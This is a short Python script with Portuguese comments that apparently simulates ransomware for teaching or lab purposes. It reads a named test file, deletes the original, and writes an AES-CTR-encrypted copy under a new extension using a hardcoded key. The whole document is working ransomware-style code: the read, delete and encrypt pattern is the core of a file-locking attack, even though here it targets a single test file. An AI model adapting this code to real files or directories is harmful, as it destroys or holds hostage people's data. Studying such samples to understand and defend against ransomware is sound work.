import os  # Importa o módulo para manipulação de arquivos e diretórios
import pyaes  # Biblioteca para criptografia AES

# Nome do arquivo a ser criptografado
file_name = "teste2025.txt"

try:
    # Abre o arquivo no modo binário para leitura
    with open(file_name, "rb") as file:
        file_data = file.read()  # Ler o conteúdo do arquivo

    # Remove o arquivo original para simular a ação de um ransomware
    os.remove(file_name)

    # Chave de criptografia
    key = b"ransomwares2025b"  # 16 bytes para AES-128
    aes = pyaes.AESModeOfOperationCTR(key)  # Inicializa o AES no modo CTR

    # Criptografa os dados do arquivo
    crypto_data = aes.encrypt(file_data)

    # Salva os dados criptografados em um novo arquivo
    encrypted_file_name = file_name + ".criptografado2025"
    with open(encrypted_file_name, 'wb') as encrypted_file:
        encrypted_file.write(crypto_data)

    print(f"Arquivo '{file_name}' criptografado com sucesso como '{encrypted_file_name}'.")

except FileNotFoundError:
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
except Exception as e:
    print(f"Erro inesperado: {e}")